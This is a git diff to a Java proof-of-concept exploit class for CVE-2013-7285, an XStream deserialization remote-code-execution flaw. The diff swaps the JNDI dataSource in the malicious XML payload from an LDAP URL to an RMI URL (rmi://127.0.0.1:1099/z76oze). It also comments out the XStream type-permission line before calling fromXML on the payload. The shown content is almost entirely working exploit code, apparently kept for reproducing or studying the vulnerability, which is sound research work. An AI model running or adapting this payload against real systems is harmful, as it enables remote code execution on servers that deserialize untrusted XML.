@@ -1,7 +1,6 @@
 package org.example;
 
 import com.thoughtworks.xstream.XStream;
-import com.thoughtworks.xstream.security.AnyTypePermission;
 
 /**
  * RCE EventHandler ProcessBuilder/JdbcRowSetImpl JNDI <=1.4.6
@@ -48,7 +47,7 @@ public class CVE_2013_7285 {
                 "            <readOnly>true</readOnly>\n" +
                 "            <rowSetType>1004</rowSetType>\n" +
                 "            <showDeleted>false</showDeleted>\n" +
-                "            <dataSource>ldap://127.0.0.1:23457/Command8</dataSource>\n" +
+                "            <dataSource>rmi://127.0.0.1:1099/z76oze</dataSource>\n" +
                 "            <listeners/>\n" +
                 "            <params/>\n" +
                 "          </default>\n" +
@@ -88,7 +87,7 @@ public class CVE_2013_7285 {
                 "</sorted-set>";
 
         XStream xstream = new XStream();
-        xstream.addPermission(AnyTypePermission.ANY);
+//        xstream.addPermission(AnyTypePermission.ANY);
         xstream.fromXML(xml);
     }
 
